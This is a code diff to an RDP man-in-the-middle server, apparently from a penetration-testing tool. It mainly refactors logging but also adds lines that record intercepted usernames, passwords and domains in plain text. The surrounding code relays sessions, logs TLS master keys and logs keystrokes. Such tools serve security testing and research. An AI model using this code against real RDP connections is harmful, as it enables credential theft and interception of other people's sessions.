@@ -1,4 +1,5 @@
 import datetime
+import logging
 import random
 from Crypto.PublicKey import RSA
 
@@ -38,6 +39,8 @@ from rdpy.recording.recorder import Recorder, FileLayer
 
 class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
     def __init__(self, targetHost, targetPort, certificateFileName, privateKeyFileName):
+        self.mitm_log = logging.getLogger("mitm.server")
+        self.mitm_connections_log = logging.getLogger("mitm.connections")
         MCSUserObserver.__init__(self)
         self.targetHost = targetHost
         self.targetPort = targetPort
@@ -107,22 +110,16 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
         log.get_ssl_logger().info(self.tpkt.previous.transport.protocol._tlsConnection.client_random(),
                                   self.tpkt.previous.transport.protocol._tlsConnection.master_key())
 
-    def log_debug(self, string):
-        log.debug("Server: %s" % string)
-
-    def log_error(self, string):
-        log.error("Server: %s" % string)
-
     def connectClient(self):
         # Connect the client side to the target machine
         self.clientConnector = reactor.connectTCP(self.targetHost, self.targetPort, self)
 
     def onConnection(self):
         # Connection sequence #0
-        self.log_debug("TCP connected")
+        self.mitm_log.debug("TCP connected")
 
     def onDisconnection(self, reason):
-        self.log_debug("Connection closed")
+        self.mitm_log.debug("Connection closed")
 
         if self.client:
             self.client.disconnect()
@@ -130,11 +127,11 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
         self.disconnectConnector()
 
     def onDisconnectProviderUltimatum(self, pdu):
-        self.log_debug("Disconnect Provider Ultimatum PDU received")
+        self.mitm_log.debug("Disconnect Provider Ultimatum PDU received")
         self.disconnect()
 
     def disconnect(self):
-        self.log_debug("Disconnecting")
+        self.mitm_log.debug("Disconnecting")
         self.tcp.disconnect()
         self.disconnectConnector()
 
@@ -145,7 +142,7 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
 
     def onConnectionRequest(self, pdu):
         # X224 Request
-        self.log_debug("Connection Request received")
+        self.mitm_log.debug("Connection Request received")
 
         # We need to save the original negotiation PDU because Windows will cut the connection if it sees that the requested protocols have changed.
         parser = RDPNegotiationRequestParser()
@@ -183,7 +180,7 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
         Parse the ClientData PDU and send a ServerData PDU back.
         :param pdu: The GCC ConferenceCreateResponse PDU that contains the ClientData PDU.
         """
-        self.log_debug("Connect Initial received")
+        self.mitm_log.debug("Connect Initial received")
         gccConferenceCreateRequestPDU = self.gcc.parse(pdu.payload)
 
         # FIPS is not implemented, so remove this flag if it's set
@@ -267,7 +264,7 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
         self.router.sendChannelJoinConfirm(result, user.userID, channelID)
 
     def buildChannel(self, mcs, userID, channelID):
-        self.log_debug("building channel {} for user {}".format(channelID, userID))
+        self.mitm_log.debug("building channel {} for user {}".format(channelID, userID))
 
         if channelID != self.serverData.network.mcsChannelID:
             return None
@@ -290,8 +287,8 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
             self.securityLayer.setNext(self.io)
             self.tpkt.setFastPathParser(self.fastPathParser)
 
-            slowPathObserver = MITMSlowPathObserver(self.io, self.recorder, name="Server")
-            fastPathObserver = MITMFastPathObserver(self.tpkt, self.recorder, name="Server")
+            slowPathObserver = MITMSlowPathObserver(self.io, self.recorder, mode=ParserMode.SERVER)
+            fastPathObserver = MITMFastPathObserver(self.tpkt, self.recorder, mode=ParserMode.SERVER)
             self.io.setObserver(slowPathObserver)
             self.tpkt.setObserver(fastPathObserver)
             self.securityLayer.createObserver(
@@ -316,7 +313,7 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
         :type pdu: RDPSecurityExchangePDU
         :return:
         """
-        self.log_debug("Security Exchange received")
+        self.mitm_log.debug("Security Exchange received")
         clientRandom = self.rc4RSAKey.decrypt(pdu.clientRandom[:: -1])[:: -1]
         self.securitySettings.setClientRandom(clientRandom)
 
@@ -326,12 +323,16 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
         Record the PDU and send it to the MITMClient.
         :type pdu: rdpy.pdu.rdp.client_info.RDPClientInfoPDU
         """
-        self.log_debug("Client Info received")
+        self.mitm_log.debug("Client Info received")
+        self.mitm_connections_log.info("CLIENT INFO RECEIVED")
+        self.mitm_connections_log.info("USER: {}".format(pdu.username))
+        self.mitm_connections_log.info("PASSWORD: {}".format(pdu.password))
+        self.mitm_connections_log.info("DOMAIN: {}".format(pdu.domain))
         self.recorder.record(pdu, RDPPlayerMessageType.CLIENT_INFO)
         self.client.onClientInfoReceived(pdu)
 
     def onLicensingPDU(self, pdu):
-        self.log_debug("Sending Licensing PDU")
+        self.mitm_log.debug("Sending Licensing PDU")
         self.securityLayer.securityHeaderExpected = False
         self.licensingLayer.sendPDU(pdu)
 
@@ -342,6 +343,6 @@ class MITMServer(ClientFactory, MCSUserObserver, MCSChannelFactory):
         # Unsure if still useful
         for event in pdu.events:
             if event.messageType == InputEventType.INPUT_EVENT_SCANCODE:
-                self.log_debug("Key pressed: 0x%2lx" % event.keyCode)
+                self.mitm_log.debug("Key pressed: 0x%2lx" % event.keyCode)
             elif event.messageType == InputEventType.INPUT_EVENT_MOUSE:
-                self.log_debug("Mouse position: x = %d, y = %d" % (event.x, event.y))
+                self.mitm_log.debug("Mouse position: x = %d, y = %d" % (event.x, event.y))
